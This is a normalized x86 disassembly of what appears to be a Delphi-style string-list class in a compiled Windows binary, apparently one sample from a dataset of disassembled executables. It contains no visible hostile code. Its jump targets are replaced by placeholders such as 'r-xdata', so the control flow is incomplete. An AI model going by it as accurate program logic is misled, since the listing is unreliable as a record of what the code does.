add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
pop ebp
retn 0x4
sub_414868
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
jmp r-xdata
pop ebp
retn 0x4
sub_414888
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_40324c
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_4148b0
push ebx
push ecx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ ebx + 0x4 ]
call [ eax + 0x1c ]
mov [ esp ] eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ esp ]
pop edx
pop ebx
retn
sub_4148d0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_41492a
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
cmp [ ebx + 0x8 ] 0x0
jg r-xdata
mov eax ebx
call sub_414180
call sub_403198
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
sub_414938
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_415490
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414628
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_414968
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_41498c
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_4149b0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414a57
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_414b00
xor eax eax
push ebp
push sub_414a3a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414a41
mov eax [ ebp - 0x4 ]
call sub_414bbc
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_414a68
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_414654
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_414b00
xor eax eax
push ebp
push sub_414ae8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov esi ebx
mov al [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] al
mov al [ esi + 0x7 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x7 ] al
mov al [ esi + 0x6 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x6 ] al
mov al [ esi + 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_414bbc
retn
sub_414b18
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_414bd0
mov ebx eax
xor bl 0x1
jmp r-xdata
sub_414b70
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_415328
mov eax [ ebp - 0x8 ]
push eax
push sub_4155d8
push ebp
call sub_414b18
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_414bd0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414c65
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414c6c
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403f0c
retn
mov esi ebx
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x9 ] 0x1
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x14 ]
pop eax
call sub_4042f4
jne r-xdata
sub_414c7c
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_414c78
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
jmp sub_403924
sub_414cb4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_414cfc
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405af8
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_414c7c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414d03
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_414d0c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414de4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_414b00
xor eax eax
push ebp
push sub_414dc2
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414dc9
mov eax [ ebp - 0x4 ]
call sub_414bbc
retn
sub_414e00
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_414e45
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_4043a8
call sub_4088e4
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414e4c
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_414e54
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414f5f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
xor ebx ebx
lea eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_403f80
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
mov ecx ebx
xor edx edx
call sub_403fd8
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0xc ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414f66
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403f0c
retn
inc esi
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x20 ]
call sub_4041a8
mov edi eax
mov eax [ ebp - 0x1c ]
call sub_4041a8
add edi eax
add ebx edi
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_4041a8
mov ebx eax
test ebx ebx
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
mov ecx ebx
call sub_4028d8
add [ ebp - 0x14 ] ebx
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
mov ecx ebx
call sub_4028d8
add [ ebp - 0x14 ] ebx
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_4041a8
mov ebx eax
test ebx ebx
je r-xdata
sub_414f7c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_414ff4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc esi
mov [ ebp - 0x8 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414ffb
lea eax [ ebp - 0xc ]
call sub_403ee8
retn
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
test eax eax
je r-xdata
sub_415008
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4150cb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_404408
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x34 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax ebx
call sub_415668
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_4040d0
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
call sub_40c6a4
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4150d2
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403f0c
lea eax [ ebp - 0xc ]
call sub_403ee8
retn
sub_4150dc
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
or esi 0xffffffff
inc ebx
xor esi esi
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp ebp eax
je r-xdata
sub_415110
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_415140
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_4161a4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_415188
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41518f
mov eax [ ebp - 0x4 ]
call sub_403198
retn
sub_415194
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_415231
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_414b00
xor eax eax
push ebp
push sub_415214
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_415cf0
sub esi eax
lea eax [ ebp - 0x8 ]
mov ecx esi
xor edx edx
call sub_403fd8
mov edx [ ebp - 0x8 ]
mov ecx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41521b
mov eax [ ebp - 0x4 ]
call sub_414bbc
retn
sub_415240
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4152e1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4152e8
lea eax [ ebp - 0x8 ]
call sub_403ee8
retn
mov eax [ ebp - 0x4 ]
call sub_414b00
xor eax eax
push ebp
push sub_4152c4
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_414bbc
retn
sub_4152f0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebp eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push ebp
mov ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_415328
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4153cc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_417ee0
mov eax [ ebp - 0x4 ]
call sub_414b00
xor eax eax
push ebp
push sub_4153a7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_416f7c
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_418b80
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4153ae
mov eax [ ebp - 0x4 ]
call sub_414bbc
retn
sub_4153d8
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_4161a4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_415423
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41542a
mov eax [ ebp - 0x4 ]
call sub_403198
retn
sub_415430
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41547d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_4041a8
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_415f54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415484
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_415490
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx esi
call sub_40564c
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x10 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0xc ]
sub_4154c4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_415507
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_4040e0
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41550e
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_415514
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4155c8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_414b00
xor edx edx
push ebp
push sub_4155ab
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4155b2
mov eax [ ebp - 0x4 ]
call sub_414bbc
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_403fd8
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx ] 0xd
jne r-xdata
sub dl 0xa
je r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
sub dl 0x3
jne r-xdata
inc ebx
inc ebx
sub_4155d8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41564e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41972c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_419734
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415655
lea eax [ ebp - 0xc ]
call sub_403ee8
retn
inc ebx
xor esi esi
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4197d4
inc esi
dec ebx
jne r-xdata
sub_415680
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x7 ]
jne r-xdata
or [ esi + 0x4 ] 0x4
mov [ esi + 0x7 ] bl
test [ esi + 0x4 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
sub_41569c
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
xor eax eax
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] eax
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414938
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x14 ] eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
test bl bl
jle r-xdata
mov ecx eax
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_404970
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_415704
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x8c ]
test al al
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ esp ] eax
jmp r-xdata
push edi
mov ecx esi
mov edx [ esp + 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov al [ ebx + 0x1d ]
sub al 0x1
jb r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
dec al
je r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_414cb4
jmp r-xdata
sub_4157a0
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x14 ]
mov edx [ r-xdata ]
call sub_404970
xor eax eax
mov [ ebx + 0x14 ] eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_4157e0
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414cb4
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
pop ebx
retn
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax [ ebx + 0x10 ]
lea edx [ eax + esi * 8 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 + 0x8 ]
call sub_4028d8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx [ r-xdata ]
call sub_404a5c
dec [ ebx + 0x14 ]
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
sub_41584c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414cb4
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx edi
mov eax ebx
call sub_414cb4
cmp edi [ ebx + 0x14 ]
jl r-xdata
test edi edi
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_4158a8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_4158a8
push ebx
mov ebx [ eax + 0x10 ]
lea edx [ ebx + edx * 8 ]
mov eax [ eax + 0x10 ]
lea eax [ eax + ecx * 8 ]
mov ecx [ edx ]
mov ebx [ eax ]
mov [ edx ] ebx
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov ebx [ eax + 0x4 ]
mov [ edx + 0x4 ] ebx
mov [ eax + 0x4 ] ecx
pop ebx
retn
sub_4158cc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov [ esp + 0x8 ] 0x0
xor esi esi
mov eax [ edi + 0x14 ]
dec eax
mov [ esp + 0xc ] eax
cmp esi [ esp + 0xc ]
jg r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] esi
